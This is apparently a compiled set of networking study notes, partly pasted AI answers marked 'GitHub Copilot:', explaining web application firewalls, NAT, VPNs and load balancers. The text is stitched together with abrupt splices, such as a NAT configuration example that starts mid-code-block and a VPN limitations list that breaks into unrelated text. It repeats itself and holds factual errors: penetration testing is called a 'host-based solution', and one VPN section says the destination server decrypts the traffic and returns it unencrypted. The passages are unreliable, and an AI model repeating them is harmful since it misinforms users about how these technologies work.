<p>A WAF is also different from anti-malware software, which is designed to detect and remove malware from a system. A WAF is designed to protect a web application from attacks, while anti-malware software is designed to protect a system from malware infections. A WAF can be deployed as a network-based or host-based solution, while anti-malware software is typically deployed as a host-based solution.</p>
<p><strong>WAFs vs. Web Application Scanners</strong>:</p>
<p>A WAF is also different from a web application scanner, which is designed to identify vulnerabilities in a web application. A WAF is designed to protect a web application from attacks, while a web application scanner is designed to identify vulnerabilities in a web application. A WAF can be deployed as a network-based or host-based solution, while a web application scanner is typically deployed as a host-based solution.</p>
<p><strong>WAFs vs. Web Application Penetration Testing</strong>:</p>
<p>A WAF is also different from web application penetration testing, which is designed to identify vulnerabilities in a web application. A WAF is designed to protect a web application from attacks, while web application penetration testing is designed to identify vulnerabilities in a web application. A WAF can be deployed as a network-based or host-based solution, while web application penetration testing is typically deployed as a host-based solution.</p>
<p>A web application firewall (WAF) is a security device that monitors, filters, and blocks malicious traffic from reaching web applications. It acts as an intermediary between a web application and the internet, inspecting incoming requests and blocking those that are deemed to be a threat.</p>
<p><strong>How WAF Works</strong></p>
<p>WAFs work by analyzing incoming HTTP and HTTPS requests and applying a set of rules to determine whether to allow or block the request. These rules are typically based on a variety of factors, such as:</p>
<ul>
<li>
<p><strong>Request headers:</strong> WAFs can examine the headers of an HTTP request, such as the User-Agent header, to identify suspicious patterns.</p>
</li>
<li>
<p><strong>Request body:</strong> WAFs can also inspect the body of an HTTP request to look for malicious code or patterns.</p>
</li>
<li>
<p><strong>URL path:</strong> WAFs can block requests to certain URLs, such as those known to host malware or phishing sites.</p>
</li>
<li>
<p><strong>IP address:</strong> WAFs can block requests from certain IP addresses, such as those known to be associated with bots or malicious actors.</p>
</li>
</ul>
<p>In addition to these basic rules, WAFs can also use more sophisticated techniques to detect and block attacks, such as:</p>
<ul>
<li>
<p><strong>Signature-based detection:</strong> This technique looks for known patterns in attack traffic.</p>
</li>
<li>
<p><strong>Heuristic-based detection:</strong> This technique looks for anomalies in request patterns that may indicate an attack.</p>
</li>
<li>
<p><strong>Behavioral-based detection:</strong> This technique monitors the behavior of web applications over time and identifies patterns that may indicate an attack.</p>
</li>
</ul>
<p><strong>Benefits of WAFs</strong></p>
<p>WAFs offer several benefits for web application security, including:</p>
<ul>
<li>
<p><strong>Protection against known attacks:</strong> WAFs can block known vulnerabilities and attacks, such as SQL injection and cross-site scripting (XSS).</p>
</li>
<li>
<p><strong>Protection against zero-day attacks:</strong> WAFs can use heuristic and behavioral-based detection techniques to identify and block zero-day attacks, which are attacks that exploit vulnerabilities that are not yet known to the public.</p>
</li>
<li>
<p><strong>Reduced workload for security teams:</strong> WAFs can automatically block malicious traffic, which can reduce the workload for security teams and allow them to focus on more complex tasks.</p>
</li>
<li>
<p><strong>Improved web application security posture:</strong> WAFs can help to improve the overall security posture of web applications by providing an additional layer of protection.</p>
</li>
</ul>
<p><strong>Challenges of WAFs</strong></p>
<p>WAFs also have some challenges, including:</p>
<ul>
<li>
<p><strong>False positives:</strong> WAFs can sometimes block legitimate traffic, which can lead to frustration for users.</p>
</li>
<li>
<p><strong>Evasion:</strong> Attackers can sometimes develop techniques to bypass WAFs.</p>
</li>
<li>
<p><strong>Cost:</strong> WAFs can be expensive to implement and maintain.</p>
</li>
</ul>
<p>Despite these challenges, WAFs are an essential component of web application security. They can provide valuable protection against a wide range of attacks and help to improve the overall security posture of web applications.</p>

<p>GitHub Copilot: Network Address Translation (NAT) is a method of remapping one IP address space into another by modifying network address information in the IP header of packets while they are in transit across a traffic routing device.</p>
<p>Here's a simplified explanation of how NAT works:</p>
<ol>
<li>
<p><strong>Address Translation</strong>: When a device inside the network sends a packet to a device outside the network, the source IP address in the packet (the IP address of the internal device) is replaced by the router's IP address. This is done by the NAT device (usually a router or firewall).</p>
</li>
<li>
<p><strong>Port Assignment</strong>: The NAT device also assigns a unique port number to each outgoing request, so it can identify which device in the internal network to send the response to.</p>
</li>
<li>
<p><strong>Address Mapping</strong>: The NAT device keeps a translation table that maps the internal IP addresses to the router's IP address and the assigned port numbers. This table is used to process the responses from external devices.</p>
</li>
<li>
<p><strong>Response Routing</strong>: When a response comes back from an external device, the NAT device uses the translation table to determine which internal device to send the response to. It replaces the destination IP address in the packet with the IP address of the internal device.</p>
</li>
</ol>
<p>As a service, NAT can be provided by a cloud service provider. In this case, the cloud provider's infrastructure performs the NAT function for the virtual machines or containers in the cloud. This allows multiple virtual machines or containers to share a public IP address, which can be beneficial for conserving IP address space and for security reasons.</p>
<p>Remember, while NAT can provide some level of security by hiding internal IP addresses, it should not be used as a substitute for a firewall or other security measures.</p>
<p>Network Address Translation (NAT) is a fundamental technology used in networking to allow multiple devices on a private or local network to share a single public IP address for communication with external networks, such as the internet. NAT works by translating private IP addresses to a single public IP address, enabling devices on the private network to access resources on the internet. NAT can be implemented as both a device and a service:</p>
<p><strong>NAT as a Device</strong>:</p>
<ol>
<li>
<p><strong>NAT Router</strong>: A NAT router or gateway is a network device that performs NAT. It typically connects the local or private network to an external network, like the internet. The NAT router maintains a table that maps internal private IP addresses and ports to a single public IP address and port. Here's how it works:</p>
<ul>
<li>When a device on the local network initiates an outbound connection to a server on the internet, the NAT router assigns an available source port and records the private IP address and port in its translation table.</li>
<li>The router then uses its public IP address and port as the source, forwarding the request to the internet.</li>
<li>When the response comes back from the internet, the router uses the information in its translation table to route the response back to the appropriate device on the local network.</li>
</ul>
</li>
<li>
<p><strong>Types of NAT</strong>:</p>
<ul>
<li><strong>Static NAT</strong>: In Static NAT, a one-to-one mapping is created between a private IP address and a public IP address. This is often used when a device on the internal network needs to be accessible from the internet.</li>
<li><strong>Dynamic NAT</strong>: Dynamic NAT assigns an available public IP address from a pool to devices on the local network as needed. Each device gets a unique public IP address for its outbound connections.</li>
<li><strong>PAT (Port Address Translation)</strong>: PAT, also known as NAT Overload, is a variation of dynamic NAT where multiple devices share a single public IP address by using different source ports. This is the most commonly used form of NAT in home networks.</li>
</ul>
</li>
</ol>
<p><strong>NAT as a Service</strong>:</p>
<ol>
<li>
<p><strong>Carrier-Grade NAT (CGN)</strong>: Some Internet Service Providers (ISPs) use CGN to perform NAT on a large scale. CGN allows the ISP to share a single public IP address among multiple customers, often due to the limited availability of IPv4 addresses.</p>
</li>
<li>
<p><strong>Cloud-Based NAT Services</strong>: Cloud providers and content delivery networks (CDNs) often provide NAT services as part of their offerings. These services enable users to access resources hosted in the cloud without exposing the internal structure of their networks.</p>
</li>
<li>
<p><strong>NAT Gateway</strong>: Many cloud platforms offer NAT gateway services that allow resources within a virtual private cloud (VPC) to access the internet while using a single public IP address.</p>
</li>
</ol>
<p><strong>Advantages of NAT</strong>:</p>
<ul>
<li><strong>IP Address Conservation</strong>: NAT helps conserve public IPv4 addresses by allowing multiple devices to share a single public IP address.</li>
<li><strong>Security</strong>: NAT acts as a basic security barrier by hiding the internal network structure from external networks.</li>
<li><strong>Network Management</strong>: NAT simplifies network management by reducing the number of public IP addresses required and providing a level of security.</li>
</ul>
<p>However, NAT can introduce complexities for certain network applications and services, which is why IPv6, with its larger address space, is being adopted to address the depletion of available IPv4 addresses and to eliminate the need for NAT in some cases.</p>
<p>Network Address Translation (NAT) is a technology that allows multiple devices to share a single public IP address, typically when connected to a router or a firewall. It works by translating private IP addresses, which are used within a local network, into public IP addresses, which are used on the internet.</p>
<p><strong>How NAT Works as a Device</strong></p>
<p>A NAT device is a hardware device that sits between a private network and a public network (such as the internet). It keeps track of the private IP addresses of all the devices on the private network and their corresponding public IP addresses. When a device on the private network sends a request to the internet, the NAT device translates the private IP address of the device into a public IP address. When the response comes back from the internet, the NAT device translates the public IP address back to the private IP address of the device that sent the request.</p>
<p><strong>How NAT Works as a Service</strong></p>
<p>NAT can also be implemented as a service, which is typically offered by internet service providers (ISPs). With NAT as a service, the ISP provides the NAT functionality, and the customer's router does not need to perform NAT itself. This can be a more convenient and cost-effective solution for some businesses.</p>
<p><strong>Benefits of NAT</strong></p>
<p>NAT offers several benefits, including:</p>
<ul>
<li>
<p><strong>Conserving IP addresses:</strong> NAT allows multiple devices to share a single public IP address, which can conserve IP addresses, especially as the number of devices connected to the internet continues to grow.</p>
</li>
<li>
<p><strong>Improving security:</strong> NAT can help to improve security by hiding the private IP addresses of devices on the private network from the internet. This can make it more difficult for attackers to target these devices.</p>
</li>
<li>
<p><strong>Simplifying network management:</strong> NAT can simplify network management by making it easier to connect multiple devices to the internet. It also reduces the need to configure firewall rules for each device.</p>
</li>
</ul>
<p><strong>Challenges of NAT</strong></p>
<p>NAT also has some challenges, including:</p>
<ul>
<li>
<p><strong>Port forwarding:</strong> Some applications require port forwarding to work properly. With NAT, port forwarding can be more difficult to configure.</p>
</li>
<li>
<p><strong>Double NAT:</strong> If two NAT devices are used on a single network, it can cause problems with connectivity.</p>
</li>
<li>
<p><strong>VPN compatibility:</strong> Some VPNs may not work properly with NAT.</p>
</li>
</ul>
<p><strong>Conclusion</strong></p>
<p>NAT is an essential technology that allows multiple devices to share a single public IP address. It helps to conserve IP addresses, improve security, and simplify network management. However, it also has some challenges, such as port forwarding, double NAT, and VPN compatibility.</p>
<p>Overall, NAT is a valuable tool that can help to improve the security and functionality of networks of all sizes.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="nat-security"><a class="header" href="#nat-security">NAT security</a></h1>
<p>NAT security, also known as Network Address Translation security, refers to the security implications of using Network Address Translation (NAT). NAT is a networking technology that translates private IP addresses used within a network to a single public IP address for internet access.</p>
<p><strong>Security Benefits of NAT:</strong></p>
<ul>
<li><strong>Limited Attack Surface:</strong> By hiding internal network devices behind a single public IP address, NAT can make it more difficult for attackers to directly target specific devices on your network.</li>
<li><strong>Improved Network Efficiency:</strong> NAT allows multiple devices to share a single internet connection, conserving public IP addresses, which are a limited resource.</li>
</ul>
<p><strong>Security Risks of NAT:</strong></p>
<ul>
<li><strong>False Sense of Security:</strong> NAT is not a security solution in itself. While it may make it harder for attackers to find devices, it doesn't prevent them from targeting the public IP address and potentially gaining access if other security measures are weak.</li>
<li><strong>Port Forwarding Risks:</strong>  Opening specific ports on the NAT router to allow access to internal services can create vulnerabilities if not configured carefully. Exposed services become potential targets for attacks.</li>
<li><strong>Limited Visibility:</strong>  Because NAT translates internal addresses, security tools and firewalls might have limited visibility into the specific source of traffic within your network, making it harder to identify and track suspicious activity.</li>
</ul>
<p><strong>Mitigating NAT Security Risks:</strong></p>
<ul>
<li><strong>Layered Security:</strong>  Don't rely solely on NAT for security. Implement firewalls, intrusion detection/prevention systems (IDS/IPS), and strong access controls for comprehensive protection.</li>
<li><strong>Minimize Port Forwarding:</strong>  Only forward ports absolutely necessary for specific services and applications. Close unused ports to reduce potential attack vectors.</li>
<li><strong>Use Strong Passwords:</strong>  Implement strong passwords for all devices and services on your network to prevent unauthorized access even if attackers bypass NAT.</li>
<li><strong>Network Segmentation:</strong>  Consider segmenting your network to isolate sensitive resources and limit the potential impact of a security breach.</li>
</ul>
<p><strong>Conclusion:</strong></p>
<p>NAT offers some security benefits by limiting the attack surface, but it's not a replacement for robust security practices. By understanding the limitations of NAT and implementing additional security measures, you can create a more secure network environment.</p>
<p>Network Address Translation (NAT) is a technology used in networking to translate private IP addresses to public IP addresses and vice versa. While NAT itself does not provide security mechanisms, it can contribute to network security in several ways:</p>
<ol>
<li>
<p><strong>IP Address Hiding</strong>: NAT hides the internal network structure by allowing multiple devices within a private network to share a single public IP address when communicating with external networks. This obfuscation helps protect internal network resources from direct exposure to the internet, making it more difficult for attackers to target specific devices.</p>
</li>
<li>
<p><strong>Traffic Filtering</strong>: NAT devices often include built-in firewall capabilities that can filter incoming and outgoing traffic based on predefined rules. These rules can restrict access to specific services, block malicious traffic, and prevent unauthorized access to internal network resources. By combining NAT with firewall functionality, organizations can implement basic network security measures to protect against various threats.</p>
</li>
<li>
<p><strong>Port Address Translation (PAT)</strong>: PAT, a variation of NAT, translates multiple private IP addresses to a single public IP address using different port numbers. This technique enables a single public IP address to support multiple internal devices simultaneously. PAT can help mitigate the exhaustion of public IP addresses and reduce the exposure of internal devices to potential attacks by sharing a common external address.</p>
</li>
<li>
<p><strong>Ingress Filtering</strong>: NAT devices can enforce ingress filtering policies to validate the source IP addresses of incoming packets and discard packets with spoofed or invalid source addresses. This prevents IP address spoofing attacks, where attackers forge the source IP address of packets to disguise their identity or evade detection. Ingress filtering helps ensure that incoming traffic originates from legitimate sources and reduces the risk of network-based attacks.</p>
</li>
<li>
<p><strong>Logging and Monitoring</strong>: Many NAT devices offer logging and monitoring capabilities to track NAT translations, analyze traffic patterns, and identify potential security incidents. By monitoring NAT logs, administrators can detect abnormal behavior, unauthorized access attempts, and suspicious traffic flows, allowing them to take appropriate actions to mitigate security risks and investigate potential security breaches.</p>
</li>
</ol>
<p>While NAT can provide some level of security benefits, it's essential to recognize that NAT alone is not a comprehensive security solution. Organizations should implement additional security measures, such as firewalls, intrusion detection/prevention systems, access controls, encryption, and security best practices, to create a layered defense strategy and mitigate a wide range of security threats effectively.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="nat-examples"><a class="header" href="#nat-examples">NAT examples</a></h1>
<p>Certainly! Here are examples of Network Address Translation (NAT) configurations commonly used in networking:</p>
<ol>
<li>
<p><strong>Static NAT (1-to-1 NAT)</strong>:</p>
<ul>
<li><strong>Scenario</strong>: Mapping a single public IP address to a specific private IP address.</li>
<li><strong>Example Configuration</strong>: 
<pre><code>ip nat inside source static [private IP] [public IP]
</code></pre>
</li>
</ul>
</li>

interface [interface type] [interface number]
  ip nat outside
</code></pre>
</li>
</ul>
</li>
</ol>
<p>These examples demonstrate various NAT configurations used to translate private IP addresses to public IP addresses and vice versa in different network scenarios. NAT plays a crucial role in conserving IPv4 address space, providing security by hiding internal network structures, and enabling connectivity between private and public networks.</p>
<h2 id="nat-in-everyday-life-examples-of-network-address-translation"><a class="header" href="#nat-in-everyday-life-examples-of-network-address-translation">NAT in Everyday Life: Examples of Network Address Translation</a></h2>
<p>Network Address Translation (NAT) is a fundamental technology behind internet access in many homes and businesses. Here are some real-world examples of how NAT is used:</p>
<p><strong>1. Home Network:</strong></p>
<ul>
<li><strong>Scenario:</strong> You have a home network with multiple devices like a computer, smartphone, tablet, and smart TV. All these devices connect to the internet through a single router.</li>
<li><strong>NAT in Action:</strong> Your router acts as the NAT device. It assigns private IP addresses (e.g., 192.168.1.x) to your devices internally. When any of your devices access the internet, the router translates the private IP address to its own public IP address provided by your internet service provider (ISP). The internet sees only the public IP address, making it appear as if all traffic originates from a single device. Websites and online services communicate back to the public IP, and the router then routes the response back to the specific device that initiated the request based on the private IP and port information.</li>
</ul>
<p><strong>2. Business Network:</strong></p>
<ul>
<li><strong>Scenario:</strong>  A company has an internal network with hundreds of computers, servers, and other devices used by employees.</li>
<li><strong>NAT in Action:</strong> Similar to a home network, the company likely uses a firewall or router with NAT capabilities. Internal devices have private IP addresses, and the NAT device translates them to a pool of public IP addresses allocated to the company by the ISP. This allows controlled internet access for employees while maintaining some level of privacy for internal resources behind the NAT.</li>
</ul>
<p><strong>3. Cloud Computing:</strong></p>
<ul>
<li><strong>Scenario:</strong> You use a cloud storage service to store your files online.</li>
<li><strong>NAT in Action:</strong> Cloud providers also leverage NAT to manage their internal networks. Public cloud services might use NAT to isolate customer data and resources, even though they share internet connectivity with other cloud services offered by the same provider.</li>
</ul>
<p><strong>4. Virtual Private Networks (VPNs):</strong></p>
<ul>
<li><strong>Scenario:</strong> You connect to a VPN to encrypt your internet traffic and potentially hide your location.</li>
<li><strong>NAT in Action:</strong> Some VPN providers use NAT to anonymize user traffic further.  The VPN service might translate your public IP address to one of their public IP addresses, making it appear as if the traffic originates from a different location associated with the VPN provider.</li>
</ul>
<p><strong>Benefits of NAT Examples:</strong></p>
<p>These examples highlight how NAT offers some advantages:</p>
<ul>
<li><strong>Efficient Use of IP Addresses:</strong> NAT allows multiple devices to share a single public IP address, conserving a limited resource.</li>
<li><strong>Limited Attack Surface:</strong> By hiding internal network devices behind a single public IP, NAT makes it more difficult for attackers to directly target specific devices.</li>
<li><strong>Network Management:</strong> NAT can be used to control and manage internet access for different devices or user groups within a network.</li>
</ul>
<p>Remember, NAT is just one piece of the security puzzle. It's crucial to implement additional security measures like firewalls, strong passwords, and secure configurations to create a robust defense against cyber threats.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="vpn"><a class="header" href="#vpn">VPN</a></h1>
<p>GitHub Copilot: A Virtual Private Network (VPN) is a service that allows you to create a secure connection to another network over the Internet. It can be used to access region-restricted websites by masking your IP address to appear as if you're browsing from the location of the VPN server.</p>
<p>Here's a simplified explanation of how a VPN works:</p>
<ol>
<li>
<p><strong>Connection Request</strong>: When you connect to a VPN, you're usually asked to enter your username and password. After that, your computer starts exchanging trusted keys with a faraway server.</p>
</li>
<li>
<p><strong>Establishing a Secure Connection</strong>: Once both computers have verified each other as authentic, all of your internet communication is encrypted and secured from eavesdropping.</p>
</li>
<li>
<p><strong>Data Transmission</strong>: The most important part of a VPN is the secure connection it establishes. This connection provides a secure &quot;tunnel&quot; through which your data travels, isolated from the rest of the web.</p>
</li>
<li>
<p><strong>IP Address Masking</strong>: When your data exits the VPN server, it appears to have the IP address of that server, masking your identity and location. To the websites and services you access, it looks like the traffic is coming from the VPN server, not from your computer or mobile device.</p>
</li>
<li>
<p><strong>Data Reception</strong>: When data is returned to you from the web, the process is reversed. The VPN server receives the data, encrypts it, and sends it through the secure tunnel to your device.</p>
</li>
</ol>
<p>VPNs are commonly used for secure access to a workplace network, or to browse the internet privately without leaving traces that can be tracked. They can also provide some level of anonymity, since your IP address is replaced with the IP address of the VPN server. However, it's important to choose a trustworthy VPN provider, as they will have access to all your network traffic.</p>
<p>A Virtual Private Network (VPN) is a technology that enables secure and private communication over the internet or other public networks. VPNs create a secure, encrypted tunnel between your device (computer, smartphone, etc.) and a remote server, allowing you to access the internet or a private network as if you were directly connected to that network. Here's how a VPN works and its key components:</p>
<p><strong>How a VPN Works</strong>:</p>
<ol>
<li>
<p><strong>Secure Connection</strong>: When you connect to a VPN service, your device establishes a secure, encrypted connection to a VPN server. This connection is often referred to as a VPN tunnel.</p>
</li>
<li>
<p><strong>Encryption</strong>: The data transmitted between your device and the VPN server is encrypted using protocols like OpenVPN, IPSec, or others. This encryption ensures that even if intercepted, your data remains confidential.</p>
</li>
<li>
<p><strong>Change of IP Address</strong>: When your device connects to the VPN server, it is assigned an IP address provided by the VPN service. This IP address may be in a different location or country, depending on the server you connect to.</p>
</li>
<li>
<p><strong>Bypassing Geographic Restrictions</strong>: By using a VPN server in a different location, you can access content and services that are typically restricted or geo-blocked in your region. For example, you can access region-restricted streaming services, websites, and other online content.</p>
</li>
<li>
<p><strong>Privacy and Anonymity</strong>: With the VPN, your online activities are routed through the server, effectively hiding your real IP address from websites and services you access. This adds a layer of anonymity and privacy to your internet usage.</p>
</li>
<li>
<p><strong>Protection on Public Wi-Fi</strong>: VPNs are particularly useful when connected to public Wi-Fi networks, as they encrypt your traffic and protect it from potential eavesdropping and cyberattacks on unsecured networks.</p>
</li>
</ol>
<p><strong>Components of a VPN</strong>:</p>
<ol>
<li>
<p><strong>Client</strong>: The VPN client is the software or app that you install on your device to connect to the VPN service. It allows you to configure settings, select a VPN server, and initiate the secure connection.</p>
</li>
<li>
<p><strong>VPN Server</strong>: The VPN server is the remote server operated by the VPN service provider. It's where your encrypted data is sent and received. VPN providers typically have servers in various locations worldwide.</p>
</li>
<li>
<p><strong>Protocols</strong>: VPNs use encryption protocols to secure the connection. Common protocols include OpenVPN, L2TP/IPsec, PPTP, and IKEv2. The choice of protocol impacts the level of security and speed.</p>
</li>
<li>
<p><strong>Authentication and Encryption</strong>: VPNs use authentication methods (e.g., username and password) and encryption algorithms to ensure the security and privacy of your data.</p>
</li>
<li>
<p><strong>Tunneling</strong>: VPNs create a secure tunnel through which your data is transmitted. This tunnel ensures that your data is protected from interception by third parties.</p>
</li>
<li>
<p><strong>Exit Points</strong>: VPN services provide multiple exit points (VPN servers) in different locations. You can choose the server to connect to, and your device appears to have an IP address from that location.</p>
</li>
<li>
<p><strong>Logging Policies</strong>: VPN providers may have various logging policies. Some keep minimal or no logs of your online activities, enhancing your privacy. Others may keep logs for various purposes.</p>
</li>
</ol>
<p>It's important to note that while VPNs offer security and privacy benefits, they do not make you completely anonymous, and the level of security and privacy depends on the VPN provider and the protocols used. Also, VPNs do not protect against all online threats, so users should still practice good cybersecurity hygiene.</p>
<p>Virtual Private Network (VPN) is a secure connection that allows you to create a private network over a public network, such as the internet. This means that you can send and receive data as if you were directly connected to a private network, even if you are actually connected to the internet.</p>
<p><strong>How VPN Works</strong></p>
<p>A VPN works by creating a secure tunnel between your device and the VPN server. This tunnel encrypts all of your data, so that it is protected from eavesdropping and tampering. The VPN server then forwards your data to the internet, where it is then routed to the destination server. The destination server then decrypts your data and sends the unencrypted response back to the VPN server. The VPN server then sends the unencrypted response to your device, and you are able to access the resources on the destination server.</p>
<p><strong>Types of VPN</strong></p>
<p>There are two main types of VPNs:</p>
<ul>
<li>
<p><strong>Site-to-Site VPN:</strong> This type of VPN is used to connect two or more networks together, such as a corporate network and a branch office network.</p>
</li>
<li>
<p><strong>Remote Access VPN:</strong> This type of VPN is used to connect a remote device to a private network, such as a home computer or a mobile device.</p>
</li>
</ul>
<p><strong>Benefits of VPN</strong></p>
<p>VPNs offer several benefits, including:</p>
<ul>
<li>
<p><strong>Increased security:</strong> VPNs can protect your data from being intercepted and tampered with by hackers.</p>
</li>
<li>
<p><strong>Improved privacy:</strong> VPNs can mask your IP address and location, so that it is difficult for websites to track your online activity.</p>
</li>
<li>
<p><strong>Access to restricted content:</strong> VPNs can be used to bypass geographical restrictions and access content that is not available in your region.</p>
</li>
</ul>
<p><strong>Challenges of VPN</strong></p>
<p>VPNs also have some challenges, including:</p>
<ul>
<li>
<p><strong>Reduced speed:</strong> VPNs can slow down your internet connection, as they encrypt your data and route it through an additional server.</p>
</li>
<li>
<p><strong>Cost:</strong> Some VPN services incur a monthly or annual fee.</p>
</li>
<li>
<p><strong>Security:</strong> Not all VPNs are created equal. Some VPNs may be less secure than others, so it is important to choose a reputable provider.</p>
</li>
</ul>
<p><strong>Conclusion</strong></p>
<p>VPNs are a valuable tool for improving the security, privacy, and accessibility of your internet connection. They are widely used by businesses, individuals, and even governments. If you are concerned about the security of your internet connection, then you should consider using a VPN.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="vpn-security"><a class="header" href="#vpn-security">VPN security</a></h1>
<p>VPN security offers a layer of protection and privacy when using the internet. It works by creating a secure tunnel between your device and a VPN server, encrypting your internet traffic and potentially masking your location. However, VPNs aren't foolproof, and it's essential to understand both the benefits and limitations of VPN security.</p>
<p><strong>Benefits of VPN Security:</strong></p>
<ul>
<li><strong>Encryption:</strong> VPNs encrypt your internet traffic, making it unreadable to anyone intercepting it on the network, such as public Wi-Fi providers or potential attackers. This helps protect your sensitive information like passwords, browsing history, and online activities.</li>
<li><strong>Enhanced Privacy:</strong> By masking your IP address, VPNs can make it appear as if you're connecting from a different location offered by the VPN server. This can be helpful for accessing geo-restricted content or browsing anonymously.</li>
<li><strong>Secure Public Wi-Fi:</strong> Using a VPN on public Wi-Fi networks adds an extra layer of security, protecting your data from potential snooping or man-in-the-middle attacks.</li>
</ul>
<p><strong>Limitations of VPN Security:</strong></p>
<ul>

Set up alerts and notifications for critical events to facilitate timely incident response and forensic analysis.</p>
</li>
<li>
<p><strong>Secure Configuration</strong>: Harden the configuration of VPN servers and clients to minimize potential security vulnerabilities and reduce the attack surface. Disable unnecessary services, protocols, and features that are not required for VPN functionality. Implement access controls, firewall rules, and intrusion detection/prevention mechanisms to protect VPN infrastructure from unauthorized access and exploitation.</p>
</li>
<li>
<p><strong>Data Leakage Prevention</strong>: Implement data leakage prevention (DLP) mechanisms to prevent unauthorized disclosure of sensitive information over VPN connections. Use content filtering, data encryption, and data loss prevention policies to control the flow of data and protect against accidental or intentional data breaches. Monitor VPN traffic for signs of data exfiltration and enforce security policies accordingly.</p>
</li>
<li>
<p><strong>Regular Security Audits and Assessments</strong>: Conduct periodic security audits, vulnerability assessments, and penetration tests to evaluate the effectiveness of VPN security controls, identify weaknesses or misconfigurations, and validate compliance with security policies and regulatory requirements. Engage third-party security professionals or consultants to perform independent assessments and provide recommendations for improvement.</p>
</li>
<li>
<p><strong>Employee Training and Awareness</strong>: Provide comprehensive training and awareness programs for VPN users to educate them about security best practices, VPN usage guidelines, and potential risks. Raise awareness about phishing attacks, social engineering tactics, and other common threats targeting VPN users. Encourage employees to report any suspicious activity or security incidents related to VPN usage promptly.</p>
</li>
</ol>
<p>By addressing these considerations, organizations can enhance the security posture of their VPN infrastructure and minimize the risk of unauthorized access, data breaches, and cyber threats.</p>

<div style="break-before: page; page-break-before: always;"></div><h1 id="load-balancer"><a class="header" href="#load-balancer">Load balancer</a></h1>
<p>GitHub Copilot: A load balancer is a device that acts as a reverse proxy and distributes network or application traffic across a number of servers. Load balancers are used to increase capacity (concurrent users) and reliability of applications.</p>
<p>Here's a simplified explanation of how a load balancer works:</p>
<ol>
<li>
<p><strong>Traffic Distribution</strong>: When the network traffic comes into the load balancer, it decides which server to forward the traffic to. This decision is based on a variety of algorithms, such as round robin, least connections, or IP hash.</p>
</li>
<li>
<p><strong>Health Checks</strong>: Load balancers regularly conduct health checks on all servers in their pool to ensure they are responsive and able to handle requests. If a server fails a health check, the load balancer stops sending traffic to that server.</p>
</li>
<li>
<p><strong>Session Persistence</strong>: Some load balancers can maintain session persistence, which means that all requests from a client during a session are sent to the same server. This is important for applications that maintain state information on the server between requests.</p>
</li>
<li>
<p><strong>SSL Termination</strong>: Load balancers can also offload work from the servers by handling the SSL encryption and decryption. This is known as SSL termination.</p>
</li>
<li>
<p><strong>Scalability</strong>: Load balancers can help scale an application by distributing traffic across a larger number of servers. They can also provide horizontal scaling, which involves adding more machines into the pool of resources.</p>
</li>
</ol>
<p>Load balancers can be a physical device or a software-based solution. They play a crucial role in maintaining the performance, availability, and resilience of web applications and services.</p>
<p>A load balancer is a network device or software application that distributes incoming network traffic (such as web requests or application traffic) across multiple servers or resources to ensure that no single server becomes overwhelmed, thereby improving the performance, availability, and reliability of a network service or application. Load balancers are essential for managing high traffic loads and ensuring that services remain accessible even when some servers fail. Here's how a load balancer works and its key functions:</p>
<p><strong>How a Load Balancer Works</strong>:</p>
<ol>
<li>
<p><strong>Traffic Distribution</strong>: When a client (such as a user's web browser) sends a request to access a service, the request first arrives at the load balancer.</p>
</li>
<li>
<p><strong>Determination of Target Server</strong>: The load balancer assesses the incoming request and makes a decision on which server or resource to route the request to. This decision can be based on various load balancing algorithms, such as Round Robin, Least Connections, or Least Response Time.</p>
</li>
<li>
<p><strong>Request Forwarding</strong>: Once the load balancer selects a target server, it forwards the client's request to that server. The server processes the request, which may include serving web pages, running applications, or handling database queries.</p>
</li>
<li>
<p><strong>Response Routing</strong>: The load balancer receives the response from the selected server and, in most cases, forwards the response back to the client. This ensures that the client receives a response from the server that processed its initial request.</p>
</li>
<li>
<p><strong>Health Checks</strong>: Load balancers continuously monitor the health of the servers in the pool. If a server becomes unresponsive, the load balancer can temporarily remove it from the pool to ensure that traffic is not directed to a failed server.</p>
</li>
<li>
<p><strong>Session Persistence</strong>: Some applications require that a client's requests are consistently directed to the same server to maintain session information. In such cases, the load balancer can use techniques like session affinity or cookie-based routing to ensure that all requests from a particular client go to the same server.</p>
</li>
</ol>
<p><strong>Load Balancer Functions and Benefits</strong>:</p>
<ol>
<li>
<p><strong>Improved Performance</strong>: By distributing traffic evenly across multiple servers, load balancers help prevent any single server from becoming overloaded. This results in improved response times and efficient resource utilization.</p>
</li>
<li>
<p><strong>High Availability</strong>: Load balancers can reroute traffic away from failed or unresponsive servers, ensuring that services remain available even when individual servers or resources experience issues.</p>
</li>
<li>
<p><strong>Scalability</strong>: Load balancers make it easier to scale a service horizontally by adding more servers to the server pool. This allows the service to handle increased traffic and demand.</p>
</li>
<li>
<p><strong>Security</strong>: Load balancers can be used to protect against distributed denial of service (DDoS) attacks by spreading the attack traffic across multiple servers, making it more difficult for attackers to overwhelm a single server.</p>
</li>
<li>
<p><strong>Flexibility</strong>: Load balancers can be configured to use different load balancing algorithms, allowing administrators to tailor the distribution of traffic to suit specific application requirements.</p>
</li>
</ol>
<p>Load balancers come in various forms, including hardware appliances, software solutions, and cloud-based services. They are commonly used in web services, e-commerce, cloud computing, and other environments where high availability and scalability are critical.</p>
<p>A load balancer is a network device that distributes incoming traffic across multiple servers. This helps to improve the performance and availability of applications and websites.</p>
<p><strong>How Load Balancer Works</strong></p>
<p>A load balancer works by intercepting requests from users and directing them to the most appropriate server. It uses a variety of criteria to determine which server to use, such as the server's load, health, and location. This helps to ensure that requests are evenly distributed across all servers, which can help to improve performance and prevent any single server from becoming overloaded.</p>
<p><strong>Types of Load Balancer</strong></p>
<p>There are two main types of load balancers:</p>
<ul>
<li>
<p><strong>Layer 4 load balancers:</strong> These load balancers operate at the Transport layer (Layer 4) of the OSI model. They work by inspecting the TCP/IP headers of packets to determine which server to use.</p>
</li>
<li>
<p><strong>Layer 7 load balancers:</strong> These load balancers operate at the Application layer (Layer 7) of the OSI model. They can inspect the content of web requests to make more intelligent decisions about which server to use, such as based on the user's request or the content of the website being accessed.</p>
</li>
</ul>
<p><strong>Benefits of Load Balancer</strong></p>
<p>Load balancers offer several benefits, including:</p>
<ul>
<li>
<p><strong>Improved performance:</strong> Load balancers can help to improve the performance of applications and websites by evenly distributing traffic across multiple servers. This can help to reduce response times and improve the overall user experience.</p>
</li>
<li>
